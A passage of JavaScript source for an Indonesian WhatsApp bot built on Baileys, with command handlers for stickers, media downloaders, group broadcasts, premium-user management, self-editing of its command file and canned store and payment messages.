let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *KalzxBotz – New Version* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`click button *enable* to enable autoread\nclick button *disable* to disable autoread`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".readchange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".readchange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'qc': {
if (!q) return reply(`📌Example: ${prefix + command} hallo`)
let obj = {
type: 'quote',
format: 'png',
backgroundColor: '#ffffff',
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await kalz.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: `${q}`,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
kalz.sendImageAsSticker(m.chat, buffer, fcall, { packname: `${global.packname}`, author: `${global.author}`})
}
break
case 'payment': {
await kalz.sendMessage(m.chat, { react: { text: "⏰",key: m.key,}})  
const url = `${qris}`
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: kalz.waUploadToServer
  })
  return imageMessage
}


    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {text: '𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗕𝗬 : 𝗛𝗔𝗜𝗞𝗔𝗟 ㋡' },
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `▬▬▬▬▬𓊈 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𓊉▬▬▬▬▬
> ❐ 𝗗𝗔𝗡𝗔 : 𝟬𝟴𝟵𝟱𝟮𝟴𝟭𝟱𝟳𝟬𝟯𝟴
> ❐ 𝗢𝗩𝗢 : 𝟬𝟴𝟵𝟱𝟮𝟴𝟭𝟱𝟳𝟬𝟯𝟴
> ❐ 𝗚𝗢𝗣𝗔𝗬 : 𝟬𝟴𝟵𝟱𝟮𝟴𝟭𝟱𝟳𝟬𝟯𝟴
> ❐ 𝗤𝗥𝗜𝗦𝗦 : 𝗦𝗜𝗟𝗔𝗞𝗔𝗡 𝗦𝗖𝗔𝗡 𝗕𝗔𝗥𝗖𝗢𝗗𝗘 𝗤𝗥𝗜𝗦 𝗗𝗜 𝗔𝗧𝗔𝗦 ↑
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

> 𝗦𝗘𝗧𝗘𝗟𝗔𝗛 𝗧𝗥𝗔𝗡𝗦𝗙𝗘𝗥, 𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗨𝗞𝗧𝗜 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗡𝗬𝗔 ㋡` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
  buttonParamsJson: `{"display_text":"𝗢𝘄𝗻𝗲𝗿 ッ","url":"https://wa.me/6289528157038","merchant_url":"https://www.google.com"}`,
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

> ⊱ 𝗦𝗲𝘁𝗲𝗹𝗮𝗵 𝗦𝘂𝗸𝘀𝗲𝘀 𝗧𝗿𝗮𝗻𝘀𝗳𝗲𝗿, 𝗖𝗼𝘀𝘁𝘂𝗺𝗲𝗿 𝗗𝗶 𝗪𝗮𝗷𝗶𝗯𝗸𝗮𝗻 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗸𝘁𝗶 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗞𝗲𝗽𝗮𝗱𝗮 𝗢𝘄𝗻𝗲𝗿
> ⊱ 𝗞𝗶𝗿𝗶𝗺 𝗕𝘂𝗸𝘁𝗶 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗦𝗲𝗰𝗮𝗿𝗮 𝗗𝗲𝘁𝗮𝗶𝗹, 𝗗𝗮𝗻 𝗞𝗹𝗶𝗸 𝗕𝘂𝘁𝘁𝗼𝗻 𝗢𝘄𝗻𝗲𝗿 𝗗𝗶 𝗕𝗮𝘄𝗮𝗵 𝗨𝗻𝘁𝘂𝗸 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗸𝘁𝗶 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
© 𝗞𝗮𝗹𝘇𝘅-𝗕𝗼𝘁𝘇 [ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 𝟭.𝟴 ]
` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
  buttonParamsJson: `{"display_text":"𝗢𝘄𝗻𝗲𝗿 ッ","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`,
                        },
                      ],
                    },
                  },

                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      {}
    );

    await kalz.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await kalz.sendImageAsStickerAV(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await kalz.sendVideoAsSticker(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 'public': {
if (!isCreator) return reply(mess.owner) 
kalz.public = true
reply('*_Sukse Change To Public_*')
}
break
case 'self': {
if (!isCreator) return reply(mess.owner) 
kalz.public = false
reply('*_Sukses Change To Self_*')
}
break
        case "upsw": {
          if (!isCreator) return reply("Owners only");
          if (args.length < 1) return reply("perihal apa?");
          if (/image/.test(mime)) {
            let imgSw = await kalz.downloadAndSaveMediaMessage(quoted);
            await kalz.sendMessage(
              "status@broadcast",
              { image: { url: imgSw }, caption: q },
              { statusJidList: pendaftar },
            );
            reply("Udah Hiyuu, Liat Aja Kalo Ga Percaya 😋");
          } else if (/video/.test(mime)) {
            let VidSw = await kalz.downloadAndSaveMediaMessage(quoted);
            await kalz.sendMessage(
              "status@broadcast",
              { video: { url: VidSw }, caption: q },
              { statusJidList: pendaftar },
            );
            reply("Done");
          } else if (/audio/.test(mime)) {
            let VnSw = await kalz.downloadAndSaveMediaMessage(quoted);
            await kalz.sendMessage(
              "status@broadcast",
              { audio: { url: VnSw }, mimetype: "audio/mp4", ptt: true },
              { backgroundColor: "#d3d3d3", statusJidList: pendaftar }, // #d3d3d3
            );
            reply("Done");
          } else if (q) {
            kalz.sendMessage(
              "status@broadcast",
              { text: q },
              {
                backgroundColor: "#FF000000",
                font: 3,
                statusJidList: pendaftar,
              },
            );
          } else {
            reply(
              "Replay Media Jika Mau Dengan Caption Ketik .upsw caption",
            );
          }
        }
        break;
        
        case "getsw": {
          if (m.quoted?.chat != "status@broadcast")
            return reply(`Reply Status WhatsApp !`);
          let buffer = await m.quoted.download();
          await kalz.sendFile(
            m.chat,
            buffer,
            "",
            m.quoted.text || "",
            null,
            false,
            { quoted: m },
          ).catch((_) => reply(m.quoted.text || ""));
        }
        break;

      case "listsw": {
          if (!isCreator) return reply("Perihal Apa?")
          if (!store.messages["status@broadcast"].array.length === 0)
            throw "Gaada 1 status pun";
          let stories = store.messages["status@broadcast"].array;
          let story = stories.filter(
            (v) => v.message && v.message.protocolMessage?.type !== 0,
          );
          if (story.length === 0) throw "Status gaada";
          const result = {};
          story.forEach((obj) => {
            let participant = obj.key.participant || obj.participant;
            participant = jidNormalizedUser(
              participant === "status_me" ? kalz.user.id : participant,
            );
            if (!result[participant]) {
              result[participant] = [];
            }
            result[participant].push(obj);
          });
          let type = (mType) =>
            getContentType(mType) === "extendedTextMessage"
              ? "text"
              : getContentType(mType).replace("Message", "");
          let text = "";
          for (let id of Object.keys(result)) {
            if (!id) return;
            text += `*- ${await kalz.getName(id)}*\n`;
            text += `${result[id].map((v, i) => `${i + 1}. ${type(v.message)}`).join("\n")}\n\n`;
          }
          await reply(text.trim(), { mentions: Object.keys(result) });
        }
        break;
        
case 'owner': {
const kontak = {
"displayName": 'My Owner',
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${global.ownername}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X-ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${global.ownername}@gmail.com\nORG: INI OWNER\nEND:VCARD`
}
await kalz.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": Styles(`My Owner KalzxFluit`), 
"containsAutoReply": true,
"mediaType": 1, 
"jpegThumbnail": fs.readFileSync("./ikal.jpg"),
"mediaUrl": `https://telegra.ph/file/505ebcfe8b2f097bf33d1.jpg`,
"sourceUrl": `https://chat.whatsapp.com/KLwRD2szGxT3FopuOIs5Wh`
}}}, { quoted: fcall })
}
break
case 'addprem':{
if (!isCreator) return reply(mess.owner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
} else {
var cekap = await kalz.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
}}
break
case 'delprem': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply('Sukses!')
} else {
var cekpr = await kalz.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./src/database/premium.json', JSON.stringify(premium))
reply('Sukses!')
}}
break
case 'listpremium': case 'listprem': {
if (!isCreator) return reply(mess.owner)
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expire :* PERMANENT\n\n`
} else {
let cekvip = Func.readTime(i.expired - Date.now())
txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
kalz.sendTextWithMentions(m.chat, txt, m)
}
break
case "bcimg": {
if (!isCreator) return reply(`Kamu Owner?`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await loading()
let getGroups = await kalz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
if (/image/.test(mime)) {
media = await kalz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await kalz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await kalz.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply(mess.owner)
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await kalz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
kalz.sendMessage(i, {text: `${text}`}, {quoted:fcall})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'restart':
if (!isCreator) return reply('wuuu')
reply(`_Restarting KalzxBot . . ._`)
await sleep(3000)
process.exit()
break
case 'runtime': {
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
rin = `*Runtime :* _${runtime(process.uptime())}_\n*Response Speed :* _${latensi.toFixed(4)} Second_\n*Ram :* _${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}_`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: Styles(rin),
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'totalfitur': {
reply(`${totalFitur()} Features`)
}
break
case 'delcase': {
if (!isCreator) return reply(`*Access Denied ❌*\n\n*Owners only*`)
if (!q) return reply('*Masukan nama case yang akan di hapus*')

dellCase('./X-code.js', q)
reply('*Dellcase Successfully*\n\n© Dellcase By KalzxFluit')
}
break
case 'addcase': {
 if (!isCreator) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'X-code.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
case 'listcase': {
let { listCase } = require('./lib/scrapelistCase.js')
reply(listCase())
}
break
case 'ai': case 'openai': {
if (!text) return reply(`${command} Apa itu Coding`)
            reply(mess.search)
            let yanz = await fetchJson(`https://api.shannmoderz.xyz/ai/letmegpt?query=${text}`)
kalz.sendMessage(m.chat, {
text: yanz.result,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `O P E N - A I`,
body: '',
thumbnailUrl: "https://telegra.ph/file/f47d75d0d4827356a526d.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
            }
break
case "listgc":{
if (!isCreator) return (`KHUSU OWNER AKU 😁`)
let getGroups = await kalz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await kalz.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break
case 'tourl': {
if (isBan) return reply2(mess.ban)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await kalz.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//================ D O W N L O A D ==================//
case 'ytmp3': case 'youtubemp3': {
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
await loading ()
reply(mess.search)
downloadMp3(text)
}
break
case "ytreels": case "ytmp4":{
if (!text) return reply('Masukan Link Nya!!!')
await loading ()
reply(mess.search)
downloadMp4(text)
}
break
case 'tt': case 'tiktok':{
if (!text) return reply(`masukan link tiktoknya`)
let old = new Date()
const dlt = require('./lib/tiktokdl.js')
let tiktuk = await dlt.DownloadTiktok(text)
if (tiktuk.result.images) {
tiktuk.result.images.forEach(async (k) => {
await kalz.sendMessage(m.chat, { image: { url: k }}, { quoted: fcall });
})
} else {
kalz.sendMessage(m.chat, { video: { url: tiktuk.result.video }, caption: `${gris}[ T I K T O K - D O W N L O A D E R ]${gris}\n\n${hiasan}*Author* : ${tiktuk.result.author.nickname}\n${hiasan}*Desc* : ${tiktuk.result.desc}\n${hiasan}*Statistic* : ${tiktuk.result.statistic}\n${hiasan}*Fetching* : ${((new Date - old) * 1)} ms\n\n` }, { quoted: fcall })
}
}
break
case 'instagram': {
  if (!text) return m.reply('masukkan url video instagram!')
  try {
    let insta = await (await fetch(`https://api.shannmoderz.xyz/downloader/instagram?url=${text}`)).json()
    let shannz = insta.result.output
    kalz.sendMessage( m.chat, { video: { url: shannz.url[0].url }, caption: `${shannz.meta.title}` },{ quoted: m })
  } catch (err) {
      m.reply('masukkan query lainnya atau coba lagi nanti')
    }
}
break
case 'spotify': {
await loading() 
if (!text) return reply(`Contoh : ${prefix + command} dandelion`);
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
const hasil = ` *🎧 S P O T I F Y*

*Title*: ${api.data[0].title}
*Duration*: ${api.data[0].duration}
*Popular*: ${api.data[0].popularity}
*Url*: ${api.data[0].url}
`
kalz.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": '𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘',
"body": `© Spotify Music`,
"showAdAttribution": true,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://telegra.ph/file/f993a3d183150aa3984f1.jpg',
"renderLargerThumbnail": true
}
}}, {quoted: fcall})
const spodl = await fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`) 
const spoDl = spodl.data.download
kalz.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘`,
body: "© Spotify Music",
thumbnailUrl: 'https://telegra.ph/file/f7ad1ebdaf077a2419ae2.jpg', 
sourceUrl: hariini,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: fcall
})
}
break
case 'play': {
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ 𝗞𝗮𝗹𝘇𝘅𝗕𝗼𝘁 - 𝗡𝗲𝘄 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 𝟭.𝟴 ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Silakan Pilih Type Download Yang Ingin Di Download`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗠𝗣𝟰 🎥\",\"id\":\".playmp4 ${text}\"}`
},
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗠𝗣𝟯 🎧\",\"id\":\".playmp3 ${text}\"}`
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'playmp3': {
await loading() 
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let wait = await kalz.sendMessage(m.chat, {text: `_Sedang Mencari... [ ${text} ] 🔍_`}, {quoted: fcall, ephemeralExpiration: 86400})
let search = await yts(`${text}`)

let data = await search.all.filter((v) => v.type == 'video')
try {
var res12 = data[0]
} catch {
var res12 = data[1]
}
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./.npm/${search.all[0].views}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
await kalz.sendMessage(m.chat, {text: `_Mengirim.. [ ${text} ] 🔍_`, edit: wait.key }, {quoted: m, ephemeralExpiration: 86400});
kalz.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {title: `${search.all[0].title}`, body: `Views : ${search.all[0].views}`, thumbnailUrl: res12?.thumbnail, mediaType: 2, mediaUrl: `${search.videos[0].url}`, sourceUrl: `${search.videos[0].url}`, renderLargerThumbnail: true }}},)
   })
   }
break

case 'playmp4':{
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let wait = await kalz.sendMessage(m.chat, {text: `_Sedang Mencari... [ ${text} ] 🔍_`}, {quoted: fcall, ephemeralExpiration: 86400})
let search = await yts(`${text}`)
const alicevidoh = require('./lib/ytdl2')
const vid=await alicevidoh.mp4(`${search.videos[0].url}`)
const ytc=`
*Tittle:* ${vid.title}
*Date:* ${vid.date}
*Duration:* ${vid.duration}
*Quality:* ${vid.quality}`
await kalz.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},)
kalz.sendMessage(m.chat, {react: {text: '🎧', key: m.key}})
}
break
//================== S T O R E =======================//
case 'testi1':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari ${namaStore}

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti ${namaStore} adalah store paling amanah dan terpercaya✨

(Testimoni ke 1)
`
kalz.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_1.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fcall})
}
break
case 'testi2':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari ${namaStore}

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti ${namaStore} adalah store paling amanah dan terpercaya✨

(Testimoni ke 2)
`
kalz.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_2.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fcall})
}
break
case 'testi3':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari ${namaStore}

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti ${namaStore} adalah store paling amanah dan terpercaya✨

(Testimoni ke 3)
`
kalz.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_3.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fcall})
}
break
case 'testi4':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari ${namaStore}

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti ${namaStore} adalah store paling amanah dan terpercaya✨

(Testimoni ke 4)
`
kalz.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_4.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fcall})
}
break
case 'testi5':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari ${namaStore}

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti ${namaStore} adalah store paling amanah dan terpercaya✨

(Testimoni ke 5)
`
kalz.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_5.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fcall})
}
break
case "reqpanel":{
if (!isCreator) return;
ewe = `*بِسۡـــــــــمِ ٱللهِ ٱلرَّحۡـمَـٰنِ ٱلرَّحِـــــــيم*

Ram : 
Username :
Nomor Wa : 
▰▰▰▰▰▰▰▰
*Garansi 14 Day*
*Create ${tanggal2}*
*Hari Ini ${hariini}*`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'tunda':
text_trxpending = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 」

𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxpending,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'proses':
text_proses = `「 𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦 」

𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_proses,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'batal':
text_trxbatal = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxbatal,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'done': case 'd': {
if (!isCreator) return reply(`Njirr Lu siapa Cuk`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
